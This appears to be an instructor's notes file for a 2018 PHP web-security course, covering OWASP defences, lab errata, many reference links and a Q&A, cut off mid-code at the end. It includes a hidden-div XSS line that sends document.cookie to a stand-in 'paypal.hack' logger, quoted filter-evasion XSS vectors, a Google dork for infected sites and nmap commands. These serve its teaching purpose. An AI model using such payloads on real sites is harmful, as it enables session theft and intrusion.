# PHP Security Notes -- Jan 2018
* Collabedit: http://collabedit.com/uacb8

## Homework for Wed 24 Jan 2018
* SQL Injection Lab
* Zed Proxy Attack Lab

## ERRATA
* http://localhost:8888/#/3/9: founden
* http://localhost:8888/#/3/15: execute([(int) $_REQUEST['topic']) missing "]"
* http://localhost:8888/#/3/31: Even if the attack is from a botnet, an excessive number of failed login attempts warns you of a potential brute force attack

## Suggestions
* Create a Docker config for course VMs
* Revise instructions vis a vis changes to the default editor
* RAM: modify Vagrantfile OR use the VirtualBox GUI
* Need to modify Vagrantfile as follows:
  * Change: `s.path = "https://s3.amazonaws.com/zend-training/provisions/provision_environment_test.sh"`
  * To: `s.path = "https://s3.amazonaws.com/zend-training/provisions/provision_environment.sh"`
  * This is the error message:
```
==> default: Running provisioner: shell...An error occurred while downloading the remote file.
The errormessage, if any, is reproduced below. Please fix this error and tryagain.
The requested URL returned error:
403 Forbidden
```

## OWASP
* Top 10 for 2017: https://www.owasp.org/images/7/72/OWASP_Top_10-2017_%28en%29.pdf.pdf

## WEBSITES WITH ERRORS:
* http://www.thamesriverservices.co.uk/timetable_winter.cfm
* Websites still infected!!!  From Google type this: inurl:"jos_users" inurl:"index.php"

* DEMO: nmap -A -T4 ip.add.re.ss

## SQL Injection Suggested Protection:
* 1: use prepared statements to enhance protection against sql injection
* 2: filter and validate all inputs
* 3: treat the database with suspicion as it could have been compromised
* LAB: solution should use prepared statements!!!

## Brute Force Suggested Protection:
* 0: Any suggested protection may be evaded if the attack is launched from a "botnet"
* 1: Tracking failed login attempts + some kind of redirection or slowdown if X # failed attempts
* 2: CAPTCHA
* 3: Cookie handling: check to see if cookie is being returned or not
* 4: Log attempts based on IP address
* 5: Employ a series of strategies if B.F. attacked detected.  Randomly choose one.  Suggestions:
    -- "Landing" page
    -- Send an email and ask for confirmation
    -- Random Timeout i.e. 30 mins
    -- Send to a page with a CAPTCHA
    -- Ask a security question
* 6: Consider resetting the password + use out-of-band notification (i.e. email)
* 7: if a high level of abuse is noted, extreme measures are called for: i.e. total lockout at IP level


## XSS:
* 1: escape, validate, filter all input
* 2: htmlspecialchars() on output (esp. suspect data)
* 3: use prepared statements + SQL injection protection to prevent stored XSS
* 4: strip_tags() and stripslashes() (maybe) on input
    UNLESS: if you're implementing a CMS, don't strip all tags (used 2nd param of strip_tags())
    Only allow certain ones
    Consider using Zend\Filter\StripTags which can also filter out selected attribs
    `strip_tags('<b onclick="javascript:alert("test")">', '<b>');`
    would still execute the javascript
* 5: Control the length of your input data
* 6: For CMS implementation, consider using other libraries
    i.e. Zend\Escaper
* 7: Use Zend\Escaper\HtmlAttrib (???) which escapes *contents* of attribs
* 8: from Keoghan to All Participants: just thought I'd share this for the times where html is needed to be allowed through:
    https://github.com/ezyang/htmlpurifier (not sure if everyone will have some across it or not)


* LAB NOTE: solution for XSS_R s/be $_POST not $_GET

## Insecure Direct Object Reference / Missing Function Level Access Control
* 1: When building the SELECT, encrypt the database key which is exposed to the form
* 2: Implement proper access control for valuable company resources ("objects")
* 3: Redirect and log the "illegal" attempt (i.e. enforce the access control)
* 4: Don't display resources that this user should not access
* 5: Proper session protection + proper logout procedure
* 6: Modify the names of the resources to make them less predictable

## CSRF
* 1: Use hard-to-predict tokens for each unique form access
    I.e. use open ssl pbkdf functionality: http://php.net/manual/en/function.openssl-pbkdf2.php
* 2: Potential programming problem: what if valid user opens same form in 2 windows?
    Possible solution: using an AJAX request (but: can trust the client?)
* 3: Create a profile of the user including User Agent + Language + IP Address etc.
* 4: Implement session protection + XSS measures
* 5: DO NOT use md5 for your hash!!!  Use something like password_hash()

* LAB: quick test: download form, make a change, submit manually, and see that you've change the password

## Session Protection:
* 1: Run session_regenerate_id() frequently to keep validity of session ID short
    but still maintain the session
* 2: Have the session ID go through cookies (instead of URL)
* 3: Create a profile of the user (i.e. IP address, browser, language settings)
    If anything changes while session is active, flag the session as suspicious
    maybe log this fact, shut down the session, etc.
* 4: Provide a logout option which destroys the session, expires the cookie and unsets data
* 5: Keep sessions as short as possible (but keep usability in mind!)
* 6: Be cautious about fixed session IDs (i.e. "remember me")!!!

## Security Misconfig
* 1: Keep all open source + other software updated
* 2: Improperly configured filesystem rights
* 3: Leaving defaults in place
* 4: Web server defaults for directories should restrict what users can see
* 5: use apachectl -l and apachectl -M to see which modules are loaded
    look for ssl_module especially
* 6: php.ini settings: allow_url_include = off; open_basedir = /set/this/to/something; doc_root = /set/to/something

## Insufficient Crypto Handling of Sensitive Data
* 1: Don't use old/weak crypto methods (i.e. md5 or sha1)
* 2: Need to determine what is "sensitive data" for your app
* 3: Make sure measures are in place when you store or transfer this data
* 4: Don't store or transmit sensitive data in plain text
* 5: Keep crypto software up to date
* 6: DO NOT use mcrypt!!!! Use openssl_encrypt() or openssl_decrypt()
    See: https://wiki.php.net/rfc/mcrypt-viking-funeral

## Command Injection
* 1: Do you really need to run system(), exec() etc.?  Maybe another way
* 2: Use escapeshellcmd/args()
* 3: php.ini setting "disable_functions = xxx" if you want to block usage of these
* 4: Filtering / validation i.e. filter_var with one of the flags
    Typecasting

## Remote Code Injection
* 1: Don't mix user input with these commands: include, require, eval()
* 2: Set php.ini allow_url_include = off
* 3: Possibly refactor your code so you don't need the user to supply actual PHP filenames
    Establish some sort of routing capability / url rewriting
    Whitelist allowed pages w/ name mappings that the user can choose
    Don't let the user see the actual php file they're going to be using
* 4: Be sure to initiate proper access control / authorization

## LATEST THREATS:
* http://researchcenter.paloaltonetworks.com/2017/04/unit42-new-iotlinux-malware-targets-dvrs-forms-botnet/
* https://www.technologyreview.com/s/603500/10-breakthrough-technologies-2017-botnets-of-things/
* http://thehackernews.com/2017/02/HoeflerText-font-chrome.html
* http://www.ibtimes.co.uk/over-1-million-decrypted-gmail-yahoo-accounts-allegedly-sale-dark-web-1609882?utm_source=yahoo&utm_medium=referral&utm_campaign=rss-related&utm_content=/rss/yahoous/news

## LATEST ATTACKS:
* Equifax Attack: https://motherboard.vice.com/en_us/article/ne3bv7/equifax-breach-social-security-numbers-researcher-warning
* http://arstechnica.com/security/2016/06/how-linkedins-password-sloppiness-hurts-us-all/
* http://arstechnica.com/security/2016/06/teamviewer-users-are-being-hacked-in-bulk-and-we-still-dont-know-how/
* http://arstechnica.com/security/2016/06/10000-wordpress-sites-imperilled-by-in-the-wild-mobile-plugin-exploit/
* http://www.tripwire.com/state-of-security/latest-security-news/one-million-wordpress-websites-vulnerable-to-sql-injection-attack/
* https://securityledger.com/2015/05/mobilizing-sql-injection-attacks-same-pig-new-lipstick/
* http://codecurmudgeon.com/wp/sql-injection-hall-of-shame/
* https://threatpost.com/polish-planes-grounded-after-airline-hit-with-ddos-attack/113412

## SQL INJECTION:
* Jul 2017: "Katyusha Scanner" : https://nakedsecurity.sophos.com/2017/07/14/sql-injection-attacks-controlled-using-telegram-messaging-app/
* May 2017: SQL Injection Vulnerability in Joomla! 3.7: https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html
* Feb 2017: SQL Injection Vulnerability in NextGEN Gallery for WordPress: https://blog.sucuri.net/2017/02/sql-injection-vulnerability-nextgen-gallery-wordpress.html
* Mar 2017: Overview of how SQL Injection attacks work: https://linuxsecurityblog.com/2017/03/19/sql-injection-attacks/
* Automated attack tools: http://hackersonlineclub.com/hacking-tools/
* https://www.quora.com/As-of-2016-are-there-websites-vulnerable-to-SQL-injection
* https://threatpost.com/attackers-targeting-unpatched-joomla-sites-through-sql-injection-vulnerability/115179/
* http://www.tripwire.com/state-of-security/latest-security-news/one-million-wordpress-websites-vulnerable-to-sql-injection-attack/
* https://securityledger.com/2015/05/mobilizing-sql-injection-attacks-same-pig-new-lipstick/
* http://codecurmudgeon.com/wp/sql-injection-hall-of-shame/

## BRUTE FORCE:
* Designing Secure Passwords: https://xkcd.com/936/
* Mar 2017: WordPress "Attack Landscape": https://www.wordfence.com/blog/2017/04/march-2017-wordpress-attack-report/
* May 2017: KnockKnock Brute Force Attack: https://www.skyhighnetworks.com/cloud-security-blog/skyhigh-discovers-ingenious-new-attack-scheme-on-office-365/
* Jul 2017: Good article on detecting a brute force attack: https://blogs.technet.microsoft.com/pie/2017/07/19/good-news-everyone-we-are-under-brute-force-attack/
* Dec 2017: Aggressive WordPress Brute Force Attack Campaign: https://www.wordfence.com/blog/2017/12/aggressive-brute-force-wordpress-attack/
* Password Cracking Tools: http://resources.infosecinstitute.com/10-popular-password-cracking-tools/
* http://arstechnica.com/security/2013/05/how-crackers-make-minced-meat-out-of-your-passwords/
* https://www.wordfence.com/blog/2016/02/wordpress-password-security/
* http://www.infosecurity-magazine.com/news/massive-bruteforce-attack-on/
* http://hashcat.net/oclhashcat/ -- 2.7 to 115 million MD5 hashes cracked per second depending on GPU available

## XSS:
* Jun 2017: XSS Overview: https://snyk.io/blog/xss-attacks-the-next-wave/
* Good Definition and Walkthrough of XSS: http://cwe.mitre.org/data/definitions/79.html
* Feb 2017: Persistent XSS Vulnerability on eBay: https://news.netcraft.com/archives/2017/02/17/hackers-still-exploiting-ebays-stored-xss-vulnerabilities-in-2017.html
* https://nakedsecurity.sophos.com/2016/01/13/ebay-xss-bug-left-users-vulnerable-to-almost-undetectable-phishing-attacks/
* https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20160407-cic

## CSRF:
* https://threatpost.com/bangladesh-bank-hackers-accessed-swift-system-to-steal-cover-tracks/117637/

## OTHER:
* http://www.cyberciti.biz/tips/php-security-best-practices-tutorial.html

## RESOURCES:
* https://security.sensiolabs.org/
* https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/
* http://kalilinuxcourse.blogspot.com/2015/11/hack-facebook-using-python-script-via-brute-force-attack.html
* http://phpsec.org/projects/guide/4.html
* https://info.whitehatsec.com/rs/whitehatsecurity/images/2015-Stats-Report.pdf
* http://httpd.apache.org/docs/current/misc/security_tips.html
* https://www.virustotal.com/en/
* http://resources.infosecinstitute.com/14-popular-web-application-vulnerability-scanners/
* https://panopticlick.eff.org/
* https://www.torproject.org/

## INSECURE CONFIG:
* http://arstechnica.com/security/2016/05/faulty-* https-settings-leave-dozens-of-visa-sites-vulnerable-to-forgery-attacks/

## PHP:
* http://www.cvedetails.com/vulnerability-list/vendor_id-74/product_id-128/PHP-PHP.html
* http://www.exploit-db.com/platform/?p=php

## EXPLOIT KITS:
* http://www.eweek.com/security/exploit-kits-deliver-big-returns-for-hackers.html
* https://nakedsecurity.sophos.com/exploring-the-blackhole-exploit-kit-3/
* https://media.blackhat.com/bh-us-12/Briefings/Jones/BH_US_12_Jones_State_Web_Exploits_Slides.pdf

## LATEST SECURITY THREATS:
* http://www.net-security.org/secworld.php?id=18087
* http://www.ponemon.org/blog/ponemon-institute-releases-2014-cost-of-data-breach-global-analysis
* http://www.darkreading.com/travel-agency-fined--gb-pound-150000-for-violating-data-protection-act/d/d-id/1297538?
* http://www.tripwire.com/state-of-security/top-security-stories/organizations-remain-vulnerable-to-sql-injection-attacks/
* http://www.sophos.com/en-us/security-news-trends/reports/security-threat-report/blackhole-exploit.aspx
* http://www.avgthreatlabs.com/webthreats/

HELP FOR HACKED SITES:
* http://www.google.com/webmasters/hacked/

PHP EXPLOITS:
* http://www.joomlaexploit.com/
* http://blog.resellerclub.com/2013/04/12/global-attack-on-wordpress-sites/
* http://www.zionsecurity.com/blog/2013/02/analysis-automated-attack-against-php-web-sites
* http://www.forbes.com/sites/anthonykosner/2013/04/13/wordpress-under-attack-how-to-avoid-the-coming-botnet/
* http://wewatchyourwebsite.com/wordpress/2013/01/attack-of-the-default-php-files/
* http://www.cerebro.com.au/2013/06/24/ddos-attack-this-blog-via-xmlrpc-php/
* http://labs.alienvault.com/labs/index.php/2013/u-s-department-of-labor-website-hacked-and-redirecting-to-malicious-code/

## CHARACTER SET ATTACKS:
* http://www.phpwact.org/php/i18n/charsets
* http://www.joelonsoftware.com/articles/Unicode.html

## OPEN SOURCE ATTACKS:
* joomla 1.5.26 hack: http://3dwebdesign.org/forum/new-joomla-1-5-26-and-joomla-2-5-exploit-t1113
* Top 10 joomla security issues: http://www.deanmarshall.co.uk/joomla-services/joomla-security/joomla-security-issues.html
* bluestork template hack: http://truxtertech.com/2012/10/joomla-bluestork-built-in-virus/
* htaccess hacked / GoDaddy: http://www.novel139.info/bbs/forum.php?mod=viewthread&tid=485
* how to secure a joomla site which has been hacked: http://forum.joomla.org/viewtopic.php?f=621&t=582854
* forum post assistant: https://github.com/ForumPostAssistant/FPA/zipball/en-GB
* http://drupal.org/node/1815912

## HACKS:
* http://www.troyhunt.com/2013/07/everything-you-wanted-to-know-about-sql.html
* http://blog.whitehatsec.com/top-ten-web-hacking-techniques-of-2012/
* https://grepular.com/Abusing_HTTP_Status_Codes_to_Expose_Private_Information
* http://lists.webappsec.org/pipermail/websecurity_lists.webappsec.org/2011-February/007533.html
* http://lists.webappsec.org/pipermail/websecurity_lists.webappsec.org/2011-March/007631.html (* http response splitting)
* http://www.darkreading.com/tech-center/6/Vulnerability_Management.html
* https://www.youtube.com/watch?v=igub7ZF5p40 [hacking things using Google, includes PHP issue]

## HACKS EXPLAINED ON YOUTUBE:
* SQL Injection: https://www.youtube.com/watch?v=N7l6pPEDuPM
* Joomla Hack:http://www.youtube.com/watch?v=KFr1k7-8HT8
* Facebook SQL Injection: https://www.youtube.com/watch?v=1yfTaXndMEM
* OWASP Security Tutorial Series:
  * https://www.youtube.com/watch?v=_Z9RQSnf8-g [owasp xss]
  * https://www.youtube.com/watch?v=pypTYPaU7mM&feature=plcp [owasp injection]

## PREVIOUS ATTACKS:
* http://arstechnica.com/security/2015/05/* https-crippling-attack-threatens-tens-of-thousands-of-web-and-mail-servers/
* http://www.darkreading.com/vulnerabilities---threats/advanced-threats/report-nsa-gchq-actively-targeted-kaspersky-lab-other-security-vendors/d/d-id/1320991?
* https://blog.sucuri.net/2015/05/jetpack-and-twentyfifteen-vulnerable-to-dom-based-xss.html
* http://www.openwall.com/lists/oss-security/2015/04/10/8
* http://www.tripwire.com/state-of-security/top-security-stories/hackers-redirected-ebay-shoppers-to-phishing-scam/
* http://www.tripwire.com/state-of-security/top-security-stories/cybercrime-ring-steals-millions-in-stubhub-tickets-arrests-followed/
* http://www.troyhunt.com/2014/02/heres-how-bell-was-hacked-sql-injection.html
* http://www.tripwire.com/state-of-security/top-security-stories/personal-bank-accounts-in-jeopardy-multi-pronged-cyber-attack-on-switzerland-underway/
* http://english.astroawani.com/news/show/malaysias-google-dell-microsoft-websites-hacked-17481
* http://japandailypress.com/nintendo-fan-site-hit-by-illegal-logins-nearly-24000-accounts-hacked-0831890
* http://uk.ign.com/articles/2013/07/02/ubisofts-uplay-service-hacked
* http://www.guardian.co.uk/world/2013/jun/10/nsa-spying-scandal-what-we-have-learned
* http://www.ehackingnews.com/2013/07/15-goa-government-websites-hacked-by.html
* http://www.ehackingnews.com/2013/03/5-cybercriminals-arrested-for-stealing.html
* http://www.zdnet.com/nbc-com-hacked-briefly-compromised-with-redkit-malware-7000011636/
* http://www.v3.co.uk/v3-uk/news/2257171/bbc-and-cnn-spam-linked-to-blackhole-exploit-kit
* http://www.bbc.co.uk/news/technology-21304049
* http://www.ehackingnews.com/2013/03/peru-bhutan-government-sites-breached.html
* http://uk.reuters.com/article/2012/11/27/us-nuclear-iaea-hacking-idUKBRE8AQ0ZY20121127
* http://www.telegraph.co.uk/news/uknews/law-and-order/9696079/Anonymous-hacker-cost-PayPal-3.5-million-by-crippling-site.html
* http://www.channel4.com/news/hackers-use-government-jobs-site-to-steal-your-data
* http://www.bbc.co.uk/news/uk-england-lancashire-20651852
* http://www.informationweek.com/security/attacks/who-is-hacking-us-banks-8-facts/240009554
* http://www.networkworld.com/news/2011/101911-sql-injection-attack-252188.html
* http://arstechnica.com/security/news/2011/03/massive-sql-injection-attack-making-the-rounds694k-urls-so-far.ars
* http://theharmonyguy.com/2011/04/21/recent-facebook-xss-attacks-show-increasing-sophistication/
* http://news.cnet.com/8301-27080_3-20107541-245/hundreds-of-go-daddy-hosted-sites-compromised/?tag=contentMain;contentBody
* http://www.informationweek.com/news/government/security/230600152
* http://www.pcworld.com/article/240205/beware_the_assembling_bot_army.html
* http://packetstormsecurity.org/news/view/19881/Japans-Biggest-Defense-Contractor-Hit-By-Hackers.html
* http://www.rawstory.com/rs/2011/06/06/sony-shares-tumble-after-latest-security-hack/
* http://news.cnet.com/8301-30685_3-20108633-264/researchers-to-detail-hole-in-web-encryption/?tag=contentMain;contentBody
* http://www.securecomputing.net.au/News/233534,googleowned-social-network-sees-400000-users-hit-by-xss-attack.aspx
* http://www.securecomputing.net.au/News/217809,researcher-demonstrates-twitter-xss-vulnerability.aspx
* http://www.pcpro.co.uk/news/security/361717/apple-tops-public-vulnerability-list

## PREVIOUS THREATS:
* http://nakedsecurity.sophos.com/exploring-the-blackhole-exploit-kit-2/
* http://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/
* http://blog.sucuri.net/2012/05/php-cgi-vulnerability-exploited-in-the-wild.html
* http://www.infoworld.com/t/application-security/critical-php-vulnerability-exposes-servers-data-theft-or-worse-192428
* http://www.nytimes.com/2012/12/06/technology/ransomware-is-expanding-in-the-united-states.html?_r=0
* http://seclists.org/fulldisclosure/2011/Mar/309
* https://www.whitehatsec.com/resource/grossmanarchives/11grossmanarchives/022111hacktechniques2011.html
* http://jeremiahgrossman.blogspot.com/2011/03/11th-whitehat-website-security.html
* http://www.sans.edu/research/security-laboratory/article/security-predict2011
* http://www.pcworld.com/article/221780/five_big_security_threats_for_2011.html
* http://www.datamation.com/security/
10 Ways the IT Department Enables Cybercrime:
* http://www.datamation.com/ebooks/35577710/95980/2117740/118895

## RESOURCES:
* http://sectools.org/
* https://panopticlick.eff.org/
* https://www.torproject.org/
* http://www.hackthissite.org/
* https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
* http://www.google.com/webmasters/hacked/
* http://www.qaguild.com/resources_tools.php#web // website security vulnerability testing tools
* http://lists.webappsec.org/pipermail/websecurity_lists.webappsec.org/
* https://www.owasp.org/index.php/Main_Page
* http://owasptop10.googlecode.com/files/OWASP%20Top%2010%20-%202010.pdf (OWASP Top 10)
* http://net-square.com/ns_whitepapers.shtml
* http://howto.cnet.com/8301-11310_39-20098098-285/how-to-check-if-a-web-site-is-safe/?tag=mncol;mlt_related
* https://github.com/sandeepcr529/codespy
* http://sla.ckers.org/forum/

## WEBINARS:
* http://www.zend.com/en/webinar/Framework/70170000000by7j-BSWAWZF2-20130123.flv // building secure ZF2 apps
* http://www.zend.com/en/resources/webinars/php
* http://www.zend.com/en/webinar/PHP/70170000000bWL2-strong-cryptographie-20110630.flv
* http://www.zend.com/webinar/Server/70170000000bHsS-webinar-guidelines-for-deploying-php-applications-20100617.flv
* http://www.zend.com/en/webinar/PHP/70170000000bAiW-webinar-troubleshooting-php-issues-best-and-worst-techniques-20100128.flv
* http://www.zend.com/en/webinar/PHP/webinar-security-20080702.flv
* http://www.zend.com/webinar/PHP/PHP-Security.flv

## PHP BEST SECURITY PRACTICE:
* http://www.php.net/manual/en/features.file-upload.php
* http://developer.yahoo.com/security/
* http://phpsec.org/projects/guide/2.html
* http://stackoverflow.com/questions/3012315/php-security-best-practices

## Topic: Building Security into Your PHP Applications
* http://www.zend.com/webinar/Framework/70170000000bEs9-webinar-secure-application-development-with-the-ZF-20100505.flv

## MySpace SAMY Worm Hack
http://namb.la/popular/

This is a classic example of a CRSF attack:
1. Hacker posted malicious code to his own MySpace page using javascript hidden in <div> tags.  He hid "javascript" from the MySpace filter by using "java\nscript".
2. When an innocent user clicked on this part of his page, the code used the user's logged in credentials to automatically add Samy to their "friend" and "hero" list.
3. The code was then replicated on the innocent user's page.  When their own friends clicked on this part of the page, they, in turn added Samy to their friends list.
NOTE: In this case the "3rd party site" = Samy's MySpace page and the Victim Site = the user's MySpace page.
etc. etc.

Contrast XSS with CSRF (slide 38)
http://en.wikipedia.org/wiki/Cross-site_request_forgery
Related: Confused Deputy Problem, Replay Attack, Session Fixation
A confused deputy is a computer program that is innocently fooled by some other party into misusing its authority. It is a specific type of privilege escalation. In information security, the confused deputy problem is often cited as an example of why capability-based security is important.
A cross-site request forgery (CSRF) is an example of a confused deputy attack against a web browser. In this case a client's web browser has no means to distinguish the authority of the client from any authority of a "cross" site that the client is accessing.

A replay attack is a form of network attack in which a valid data transmission is maliciously or fraudulently repeated or delayed. This is carried out either by the originator or by an adversary who intercepts the data and retransmits it, possibly as part of a masquerade attack by IP packet substitution (such as stream cipher attack).

## CSRF FAQ
* http://www.cgisecurity.com/csrf-faq.html
* Google Gmail CSRF Hack: http://directwebremoting.org/blog/joe/2007/01/01/csrf_attacks_or_how_to_avoid_exposing_your_gmail_contacts.html

-- 39 ------------------------------
Note: the HTML for the 3rd party site has been hacked
Hacker used an <img> tag to send info to the victim site (?)

-- 40 ------------------------------
Protection: stamp form requests with some sort of token or session ID

-- 41 ------------------------------
Session Hijacking: where user fails to logout from a sensitive site, then the janitor gets onto their computer or the hacker has injected javascript which reads cookies and sends it to an "evil" site or a packet sniffer on the network captures this info

Session Fixation: often used for digital downloads -- customer gets unique URL
In computer network security, session fixation attacks attempt to exploit the vulnerability of a system which allows one person to fixate (set) another person's session identifier (SID). Most session fixation attacks are web based, and most rely on session identifiers being accepted from URLs (query string) or POST data.

Used especially in sites where user is "logged in all the time" or where there is a "remember me" function (usually = session info stored in cookie)

-- 43 ------------------------------
See "bad_cookie_fixed.php"

-- 44 ------------------------------
Demo file upload and show phpinfo() data for $_FILES
File MIME type forged (?)
CHECKING MIME TYPE MIGHT NOT BE ENOUGH!

DEMO:

1.  cd /var/www/php_sec
2.  hd hacked.jpg
3.  Notice javascript embedded at end of jpg
4.  Demo how file comes up OK in browser and appears to be a normal jpg

-- 45 ------------------------------
Potential command injection attack
Check php.ini and make sure tmp upload directory is outside of document root
Instead of file_exists(), use is_uploaded_file()
$cmp_name relies on user supplied filename = should not be trusted

-- 47 ------------------------------
session_regenerate_id --> need to add TRUE to make sure old session is removed
DEMO: session_regenerate_id.php

-- 49 ------------------------------
php.net/manual/en/features.safe-mode.functions.php
NOTE: Safe Mode is deprecated
(see http://www.breakingpointsystems.com/community/blog/php-safe-mode-considered-harmful/)
open_basedir = /xxx
REF: http://www.php.net/manual/en/ini.core.php#ini.open-basedir
register_long_arrays -- deprecated in PHP 5.3
REF: http://www.php.net/manual/en/ini.core.php#ini.register-long-arrays

-- 51 ------------------------------
In this context: not like test environment (i.e. PayPal developer's sandbox)
Area which is attractive to attackers
Used to gather data on attacker

-- 52 ------------------------------
Tarpits -- Wells Fargo used to use that technique
Works in asynchronous apps (i.e. email)
http://projecthoneypot.org/

-- 53 ------------------------------
Can be effective if part of a larger strategy
Another layer in the onion

-- 54 ------------------------------
Ajax definition:
A method by which asynchronous calls are made to web servers without causing a full refresh of the webpage. This kind of interaction is made possible by three different components: a client-side scripting language, the XmlHttpRequest (XHR) object and XML.
Developers have found many uses for Ajax such as "suggestive" textboxes (such as Google Suggest) and auto-refreshing data lists.
Security Implications:
* Client side security controls can be easily compromised
* Increases "attack surface"
* Gap between users and services shortened = less room for validation, etc.
* Increased exposure to XSS attacks
    * e.g. SQL statements, table and column names, are exposed
AJAX complicates security testing
* The page "state" is no longer well defined
* Async nature means testing may not catch requests initiated through timer events
* Test tools may not be geared to test transmitted XML data and may not be
  designed to parse and/or execute and test javascript
http://www.securityfocus.com/infocus/1868
http://www.acunetix.com/websitesecurity/ajax.htm

DEMO: use Wireshark to test AJAX transfer w/ Google word completion

-- 55 ------------------------------
https://www.owasp.org/index.php/OWASP_AJAX_Security_Guidelines
http://net-square.com/whitepapers/Top_10_Ajax_SH_v1.1.pdf

-- 57 ------------------------------
From: http://ha.ckers.org/xss.html
fromCharCode (if no quotes of any kind are allowed you can eval() a fromCharCode in JavaScript to create any XSS vector you need).

Example:
<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
UTF-8 Unicode encoding (all of the XSS examples that use a javascript: directive inside of an <IMG tag will not work in Firefox or Netscape 8.1+ in the Gecko rendering engine mode). Use the XSS calculator for more information:

Example:
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>

Vulnerabilities of PHP to multibyte encoding:
REF: http://www.phpwact.org/php/i18n/utf-8

Demo: tag_test.html

-- 59 ------------------------------
Also:
Gen Security Tools: http://sectools.org/
Untangle: http://www.untangle.com/
Snort: http://www.snort.org/
nmap: http://nmap.org/
iptables rules generator: http://easyfwgen.morizot.net/gen/
Arachni: http://arachni.segfault.gr/ (web app security scanner)
Joomla: https://lists.owasp.org/mailman/listinfo/owasp-joomla-vulnerability-scanner
PHP: http://pear.php.net/package/PHP_CodeSniffer

DEMO:
Checking a file with PHP_CodeSniffer
$ phpcs /var/www/php_sec/bad_get_example.php

--------------------------------------------------------------------------------
FOUND 5 ERROR(S) AFFECTING 2 LINE(S)
--------------------------------------------------------------------------------
  2 | ERROR | Missing file doc comment
 20 | ERROR | PHP keywords must be lowercase; expected "false" but found "FALSE"
 47 | ERROR | Line not indented correctly; expected 4 spaces but found 1
 51 | ERROR | Missing function doc comment
 88 | ERROR | Line not indented correctly; expected 9 spaces but found 6
--------------------------------------------------------------------------------

DEMO: nmap -A -T4 172.16.82.1
DEMO: wireshark packet capture
DEMO: logwatch

* IE Tools:
  * http://portswigger.net/burp/proxy.html
  * http://blogs.msdn.com/b/ie/archive/2008/09/03/developer-tools-in-internet-explorer-8-beta-2.aspx
  * http://msdn.microsoft.com/en-us/ie/aa740478

* Chrome:
  * http://code.google.com/chrome/devtools/docs/overview.html

* Encryption:
  * REF: http://www.zend.com/en/webinar/PHP/70170000000bWL2-strong-cryptographie-20110630.flv

After module 4, use the VM to figure out where insecurities lie
Are your cookies really safe?<div style="visibility:hidden;"><img name="x" src="default.png"><script>document.x.src="http://paypal.hack/logger.php?info="+document.cookie;alert("I guess not!");</script></div>


## Q & A
* Q: Brute force detector lab setup?
* A: Need to create a table "bfdetect"
```
CREATE TABLE `bfdetect` (
  `id` bigint(3) unsigned NOT NULL auto_increment,
  `today` varchar(20) NOT NULL,
  `minute` varchar(3) NOT NULL,
  `ip` varchar(16) NOT NULL,
  `forward_ip` varchar(500) NOT NULL,
  `useragent` varchar(100) NOT NULL,
  `userlan` varchar(100) NOT NULL,
  `isnotify` char(1) default '0',
  `notify4today` char(1) default '0',
  PRIMARY KEY  (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;
   (Look in /securitytraining/data/sql/course.sql
. Based on the config, found in the securitytraining app config under the 'bfdetect' key, the detector checks the table for previous requests from the various $_SERVER params and logs the request. After four (config) requests are made from the same $_SERVER params within a 5 minute (config) setting, a log entry is created and a response to the attacker is slowed with a sleep option. In order for this script to work, you have to log more than 4 requests in 5 minutes in order for the log entry and sleep response. I decided not to populate the data due to this timing requirement which is based on the current server time.
```
[8:55:55 PM] Daryl Wood: You can populate the table with four quick CLI executions, then run the fifth from the securitytraining brute force page with the login. I just noticed the SQL table is not in the VM version. Oops , sorry for that, will fix this.
[9:00:00 PM] Daryl Wood: Just fixed the VM to include the bfdetect table. In the mean time, have your students load the table create SQL from the dump, and you should be able to run the BF tool.


* Q: The example in the slides discussing CSRF has this code:
   $token = md5 ( uniqid ( rand (), TRUE ) );
   But I understand md5() is not strong.  Do you have any other suggestions?
* A: md5() can indeed be cracked by hacking tools such as hashcat.
   md5() is useful when you need to generate a quick hash but where it's not important if somebody can reverse it.
   For example, it might be useful to produce a key from an uploaded image filename which is used for internal storage.
   md5() will do that for you quickly.  For anything which "goes public" however it's best to use something stronger.
   If you look at http://php.net/uniqid you will see that it does not produce a cryptographically secure id.
   The same is true of the rand() function: over several iterations its output becomes predictable, which
   brute force tools latch onto and make it easier to crack a hash based on such values.
   password_hash('text', PASSWORD_BCRYPT) will produce a BCRYPT hash which is much stronger and harder to break.
   If you have OpenSSL installed + the PHP OpenSSL extension enabled, you can use openssl_random_pseudo_bytes().
   PHP 7 introduced two CSPRNG functions: random_int() and random_bytes() which use randomization available from the OS
   which in turn uses hardware.  Here is a potential replacement for the statement given in the question:
   $token = bin2hex(random_bytes(32));

* Q: RE: memory + post limits in php.ini
* A:  upload_max_filesize < post_max_size <  memory_limit

* Q: Suggestions on penetration testing tools, esp. PHP?
* A:
  * MetaSploit
  * Nessus
  * Snort.org
  * Owasp.org tools page

* Q: Fingerprinting suggestions?
* A: https://github.com/Valve/fingerprintjs2

* Q: What is a botnet?
* A: A network of slaved computers infected with controlling malware.
   See: https://en.wikipedia.org/wiki/Botnet

* Q: How large can a botnet become?
* A: The largest botnets detected in 2015 were the following:
   Ramnit: 3,000,000 computers
   Zeus: 3,600,000 computers
   TDL4: 4,500,000 computers
   ZeroAccess: 1,900,000 computers
   Storm: 250,000 to 50,000,000 computers
   Cutwail: 2,000,000 computers
   Conficker: at its peak in 2009 3,000,000 to 4,000,000 computers
   Windigo: 10,000 Linux servers (!!!)
   See: https://www.welivesecurity.com/2015/02/25/nine-bad-botnets-damage/
   See: https://en.wikipedia.org/wiki/Botnet


* Q: Can you address how to protect from hacked images like that jpeg?
* A: jpegs infected with a virus are not a danger unless they area "executed" directly by the OS.
   Example: W32.Perrun was discovered in 2002, but is still around but mainly contained
   See: http://www.symantec.com/security_response/writeup.jsp?docid=2002-061310-4234-99
   Recommendation: train users *not* to open suspicious attachments (which is the usual form of delivery)

## CLASS CODE EXAMPLES

```
// xss stored solution
<?php

//Code to authenticate and authorize access...

if(isset($_POST['btnSign']))
{
